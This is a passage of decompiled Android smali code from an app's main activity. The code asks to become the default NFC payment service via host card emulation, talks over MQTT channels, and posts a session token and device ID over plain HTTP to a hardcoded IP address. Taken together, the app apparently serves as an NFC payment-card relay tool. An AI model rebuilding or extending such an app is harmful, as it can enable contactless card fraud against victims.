    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 49
    .line 50
    .line 51
    sget-object v3, Lt1/n;->e:Ljava/lang/String;

    .line 52
    .line 53
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 54
    .line 55
    .line 56
    const-string v3, "\u5df2\u79bb\u7ebf"

    .line 57
    .line 58
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 59
    .line 60
    .line 61
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    move-result-object v2

    .line 65
    invoke-virtual {v0, v1, v2}, LG0/h;->C(Lnfc/share/nfcshare/model/MqttChannel;Ljava/lang/String;)V

    .line 66
    .line 67
    .line 68
    new-instance v0, Landroid/os/Handler;

    .line 69
    .line 70
    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    .line 71
    .line 72
    .line 73
    move-result-object v1

    .line 74
    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 75
    .line 76
    .line 77
    new-instance v1, Landroidx/emoji2/text/m;

    .line 78
    .line 79
    const/4 v2, 0x1

    .line 80
    invoke-direct {v1, v2}, Landroidx/emoji2/text/m;-><init>(I)V

    .line 81
    .line 82
    .line 83
    const-wide/16 v2, 0x0

    .line 84
    .line 85
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 86
    .line 87
    .line 88
    :cond_0
    return-void
.end method

.method public final onResume()V
    .locals 5

    .line 1
    invoke-super {p0}, Le/f;->onResume()V

    .line 2
    .line 3
    .line 4
    new-instance v0, Lt1/d;

    .line 5
    .line 6
    const/4 v1, 0x0

    .line 7
    invoke-direct {v0, p0, v1}, Lt1/d;-><init>(Lnfc/share/nfcshare/MainActivity;I)V

    .line 8
    .line 9
    .line 10
    invoke-static {p0, v1, v0}, Lt1/b;->a(Lnfc/share/nfcshare/MainActivity;ZLt1/a;)V

    .line 11
    .line 12
    .line 13
    invoke-virtual {p0}, Lnfc/share/nfcshare/MainActivity;->s()V

    .line 14
    .line 15
    .line 16
    const-string v0, "UserSession"

    .line 17
    .line 18
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 19
    .line 20
    .line 21
    move-result-object v2

    .line 22
    const-string v3, "urlInfo"

    .line 23
    .line 24
    const/4 v4, 0x0

    .line 25
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 26
    .line 27
    .line 28
    move-result-object v2

    .line 29
    if-eqz v2, :cond_0

    .line 30
    .line 31
    iput-object v2, p0, Lnfc/share/nfcshare/MainActivity;->C:Ljava/lang/String;

    .line 32
    .line 33
    :cond_0
    sget-object v2, Lt1/n;->b:LG0/h;

    .line 34
    .line 35
    if-eqz v2, :cond_1

    .line 36
    .line 37
    sget-boolean v3, LG0/h;->f:Z

    .line 38
    .line 39
    if-nez v3, :cond_1

    .line 40
    .line 41
    :try_start_0
    iget-object v3, p0, Lnfc/share/nfcshare/MainActivity;->C:Ljava/lang/String;

    .line 42
    .line 43
    invoke-virtual {v2, v3}, LG0/h;->g(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 44
    .line 45
    .line 46
    goto :goto_0

    .line 47
    :catch_0
    move-exception v2

    .line 48
    invoke-virtual {v2}, Ljava/lang/Throwable;->printStackTrace()V

    .line 49
    .line 50
    .line 51
    :cond_1
    :goto_0
    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 52
    .line 53
    .line 54
    move-result-object v0

    .line 55
    const-string v1, "ping_ip"

    .line 56
    .line 57
    invoke-interface {v0, v1, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 58
    .line 59
    .line 60
    move-result-object v0

    .line 61
    invoke-static {p0}, Lt1/b;->b(Landroid/content/Context;)I

    .line 62
    .line 63
    .line 64
    move-result v1

    .line 65
    invoke-static {v0, v1}, Lnfc/share/nfcshare/MainActivity;->u(Ljava/lang/String;I)V

    .line 66
    .line 67
    .line 68
    return-void
.end method

.method public final s()V
    .locals 7

    .line 1
    invoke-static {p0}, Landroid/nfc/NfcAdapter;->getDefaultAdapter(Landroid/content/Context;)Landroid/nfc/NfcAdapter;

    .line 2
    .line 3
    .line 4
    move-result-object v0

    .line 5
    const-string v1, "Important Tips"

    .line 6
    .line 7
    const v2, 0x7f100160

    .line 8
    .line 9
    .line 10
    const v3, 0x7f07007b

    .line 11
    .line 12
    .line 13
    const/4 v4, 0x0

    .line 14
    if-eqz v0, :cond_0

    .line 15
    .line 16
    invoke-virtual {v0}, Landroid/nfc/NfcAdapter;->isEnabled()Z

    .line 17
    .line 18
    .line 19
    move-result v0

    .line 20
    if-nez v0, :cond_0

    .line 21
    .line 22
    new-instance v0, Landroid/app/AlertDialog$Builder;

    .line 23
    .line 24
    invoke-direct {v0, p0, v2}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    .line 25
    .line 26
    .line 27
    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    .line 28
    .line 29
    .line 30
    move-result-object v0

    .line 31
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 32
    .line 33
    .line 34
    move-result-object v0

    .line 35
    const-string v1, "NFC is not enabled. Please go to System Settings and enable NFC permission. If it is already enabled, please restart your device and try again!"

    .line 36
    .line 37
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 38
    .line 39
    .line 40
    move-result-object v0

    .line 41
    new-instance v1, Lt1/e;

    .line 42
    .line 43
    invoke-direct {v1, p0, v4}, Lt1/e;-><init>(Lnfc/share/nfcshare/MainActivity;I)V

    .line 44
    .line 45
    .line 46
    const-string v2, "Go to open"

    .line 47
    .line 48
    invoke-virtual {v0, v2, v1}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 49
    .line 50
    .line 51
    move-result-object v0

    .line 52
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    .line 53
    .line 54
    .line 55
    move-result-object v0

    .line 56
    invoke-virtual {v0, v4}, Landroid/app/Dialog;->setCanceledOnTouchOutside(Z)V

    .line 57
    .line 58
    .line 59
    invoke-virtual {v0, v4}, Landroid/app/Dialog;->setCancelable(Z)V

    .line 60
    .line 61
    .line 62
    invoke-virtual {v0}, Landroid/app/Dialog;->show()V

    .line 63
    .line 64
    .line 65
    return-void

    .line 66
    :cond_0
    invoke-static {p0}, Landroid/nfc/NfcAdapter;->getDefaultAdapter(Landroid/content/Context;)Landroid/nfc/NfcAdapter;

    .line 67
    .line 68
    .line 69
    move-result-object v0

    .line 70
    if-nez v0, :cond_1

    .line 71
    .line 72
    new-instance v0, Landroid/app/AlertDialog$Builder;

    .line 73
    .line 74
    const v5, 0x7f10013e

    .line 75
    .line 76
    .line 77
    invoke-direct {v0, p0, v5}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    .line 78
    .line 79
    .line 80
    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    .line 81
    .line 82
    .line 83
    move-result-object v0

    .line 84
    const-string v5, "NFC"

    .line 85
    .line 86
    invoke-virtual {v0, v5}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 87
    .line 88
    .line 89
    move-result-object v0

    .line 90
    const-string v5, "Device without NFC support. Install on another device."

    .line 91
    .line 92
    invoke-virtual {v0, v5}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 93
    .line 94
    .line 95
    move-result-object v0

    .line 96
    const-string v5, "OK"

    .line 97
    .line 98
    const/4 v6, 0x0

    .line 99
    invoke-virtual {v0, v5, v6}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 100
    .line 101
    .line 102
    move-result-object v0

    .line 103
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    .line 104
    .line 105
    .line 106
    move-result-object v0

    .line 107
    invoke-virtual {v0, v4}, Landroid/app/Dialog;->setCanceledOnTouchOutside(Z)V

    .line 108
    .line 109
    .line 110
    invoke-virtual {v0, v4}, Landroid/app/Dialog;->setCancelable(Z)V

    .line 111
    .line 112
    .line 113
    invoke-virtual {v0}, Landroid/app/Dialog;->show()V

    .line 114
    .line 115
    .line 116
    move v0, v4

    .line 117
    goto :goto_0

    .line 118
    :cond_1
    invoke-static {v0}, Landroid/nfc/cardemulation/CardEmulation;->getInstance(Landroid/nfc/NfcAdapter;)Landroid/nfc/cardemulation/CardEmulation;

    .line 119
    .line 120
    .line 121
    move-result-object v0

    .line 122
    iput-object v0, p0, Lnfc/share/nfcshare/MainActivity;->E:Landroid/nfc/cardemulation/CardEmulation;

    .line 123
    .line 124
    new-instance v0, Landroid/content/ComponentName;

    .line 125
    .line 126
    const-class v5, Lnfc/share/nfcshare/service/EmulationService;

    .line 127
    .line 128
    invoke-direct {v0, p0, v5}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 129
    .line 130
    .line 131
    iget-object v5, p0, Lnfc/share/nfcshare/MainActivity;->E:Landroid/nfc/cardemulation/CardEmulation;

    .line 132
    .line 133
    const-string v6, "payment"

    .line 134
    .line 135
    invoke-virtual {v5, v0, v6}, Landroid/nfc/cardemulation/CardEmulation;->isDefaultServiceForCategory(Landroid/content/ComponentName;Ljava/lang/String;)Z

    .line 136
    .line 137
    .line 138
    move-result v0

    .line 139
    :goto_0
    if-nez v0, :cond_2

    .line 140
    .line 141
    sget-object v0, Lt1/n;->a:LS0/d;

    .line 142
    .line 143
    const-string v0, "ServerSettings"

    .line 144
    .line 145
    invoke-virtual {p0, v0, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 146
    .line 147
    .line 148
    move-result-object v0

    .line 149
    const-string v5, "isPosMode"

    .line 150
    .line 151
    invoke-interface {v0, v5, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 152
    .line 153
    .line 154
    move-result v0

    .line 155
    if-eqz v0, :cond_2

    .line 156
    .line 157
    new-instance v0, Landroid/app/AlertDialog$Builder;

    .line 158
    .line 159
    invoke-direct {v0, p0, v2}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    .line 160
    .line 161
    .line 162
    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setIcon(I)Landroid/app/AlertDialog$Builder;

    .line 163
    .line 164
    .line 165
    move-result-object v0

    .line 166
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 167
    .line 168
    .line 169
    move-result-object v0

    .line 170
    const-string v1, "NFC Not set as default NFC payment app. Please go to system NFC settings to make sure the software works properly."

    .line 171
    .line 172
    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    .line 173
    .line 174
    .line 175
    move-result-object v0

    .line 176
    new-instance v1, Lt1/e;

    .line 177
    .line 178
    const/4 v2, 0x1

    .line 179
    invoke-direct {v1, p0, v2}, Lt1/e;-><init>(Lnfc/share/nfcshare/MainActivity;I)V

    .line 180
    .line 181
    .line 182
    const-string v2, "Go to Settings"

    .line 183
    .line 184
    invoke-virtual {v0, v2, v1}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    .line 185
    .line 186
    .line 187
    move-result-object v0

    .line 188
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->create()Landroid/app/AlertDialog;

    .line 189
    .line 190
    .line 191
    move-result-object v0

    .line 192
    invoke-virtual {v0, v4}, Landroid/app/Dialog;->setCanceledOnTouchOutside(Z)V

    .line 193
    .line 194
    .line 195
    invoke-virtual {v0, v4}, Landroid/app/Dialog;->setCancelable(Z)V

    .line 196
    .line 197
    .line 198
    invoke-virtual {v0}, Landroid/app/Dialog;->show()V

    .line 199
    .line 200
    .line 201
    :cond_2
    return-void
.end method

.method public final t()V
    .locals 9

    .line 1
    const-string v0, "token"

    .line 2
    .line 3
    new-instance v1, LP0/A;

    .line 4
    .line 5
    const/16 v2, 0xd

    .line 6
    .line 7
    invoke-direct {v1, v2, p0}, LP0/A;-><init>(ILjava/lang/Object;)V

    .line 8
    .line 9
    .line 10
    invoke-virtual {p0, v1}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 11
    .line 12
    .line 13
    new-instance v1, Lt1/d;

    .line 14
    .line 15
    const/4 v2, 0x2

    .line 16
    invoke-direct {v1, p0, v2}, Lt1/d;-><init>(Lnfc/share/nfcshare/MainActivity;I)V

    .line 17
    .line 18
    .line 19
    sget-object v3, Lt1/b;->a:Lv1/o;

    .line 20
    .line 21
    :try_start_0
    new-instance v3, Lorg/json/JSONObject;

    .line 22
    .line 23
    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 24
    .line 25
    .line 26
    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    .line 27
    .line 28
    .line 29
    move-result-object v3

    .line 30
    sget-object v4, Lt1/b;->a:Lv1/o;

    .line 31
    .line 32
    invoke-static {v3, v4}, LA1/i;->b(Ljava/lang/String;Lv1/o;)LA1/i;

    .line 33
    .line 34
    .line 35
    move-result-object v3

    .line 36
    const-string v4, "UserSession"

    .line 37
    .line 38
    const/4 v5, 0x0

    .line 39
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 40
    .line 41
    .line 42
    move-result-object v4

    .line 43
    const-string v6, ""

    .line 44
    .line 45
    invoke-interface {v4, v0, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 46
    .line 47
    .line 48
    move-result-object v4

    .line 49
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 50
    .line 51
    .line 52
    move-result-object v6

    .line 53
    const-string v7, "android_id"

    .line 54
    .line 55
    invoke-static {v6, v7}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 56
    .line 57
    .line 58
    move-result-object v6

    .line 59
    new-instance v7, LH/e;

    .line 60
    .line 61
    invoke-direct {v7}, LH/e;-><init>()V

    .line 62
    .line 63
    .line 64
    const-string v8, "http://154.205.156.112//api/user_logout"

    .line 65
    .line 66
    invoke-virtual {v7, v8}, LH/e;->o(Ljava/lang/String;)V

    .line 67
    .line 68
    .line 69
    invoke-virtual {v7, v0, v4}, LH/e;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 70
    .line 71
    .line 72
    const-string v0, "uuid"

    .line 73
    .line 74
    invoke-virtual {v7, v0, v6}, LH/e;->i(Ljava/lang/String;Ljava/lang/String;)V

    .line 75
    .line 76
    .line 77
    const-string v0, "language"

    .line 78
    .line 79
    const-string v4, "English"

    .line 80
    .line 81
    invoke-virtual {v7, v0, v4}, LH/e;->a(Ljava/lang/String;Ljava/lang/String;)V

    .line 82
    .line 83
    .line 84
    const-string v0, "POST"

    .line 85
    .line 86
    invoke-virtual {v7, v0, v3}, LH/e;->j(Ljava/lang/String;LA1/i;)V

    .line 87
    .line 88
    .line 89
    invoke-virtual {v7}, LH/e;->b()Lj/t;

    .line 90
    .line 91
    .line 92
    move-result-object v0

    .line 93
    invoke-static {p0}, Lt1/b;->c(Lnfc/share/nfcshare/MainActivity;)Lv1/q;

    .line 94
    .line 95
    .line 96
    move-result-object v3

    .line 97
    invoke-virtual {v3}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 98
    .line 99
    .line 100
    new-instance v4, Lz1/h;

    .line 101
    .line 102
    invoke-direct {v4, v3, v0, v5}, Lz1/h;-><init>(Lv1/q;Lj/t;Z)V

    .line 103
    .line 104
    .line 105
    new-instance v0, Lj/d0;

    .line 106
    .line 107
    invoke-direct {v0, v2, v1}, Lj/d0;-><init>(ILjava/lang/Object;)V

    .line 108
    .line 109
    .line 110
    invoke-virtual {v4, v0}, Lz1/h;->e(Lv1/d;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 111
    .line 112
    .line 113
    return-void

    .line 114
    :catch_0
    move-exception v0

    .line 115
    new-instance v2, Ljava/lang/StringBuilder;

    .line 116
    .line 117
    const-string v3, "\u8bf7\u6c42\u521b\u5efa\u5931\u8d25: "

    .line 118
    .line 119
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 120
    .line 121
    .line 122
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 123
    .line 124
    .line 125
    move-result-object v0

    .line 126
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 127
    .line 128
    .line 129
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 130
    .line 131
    .line 132
    move-result-object v0

    .line 133
    invoke-virtual {v1, v0}, Lt1/d;->b(Ljava/lang/String;)V

    .line 134
    .line 135
    .line 136
    return-void
.end method
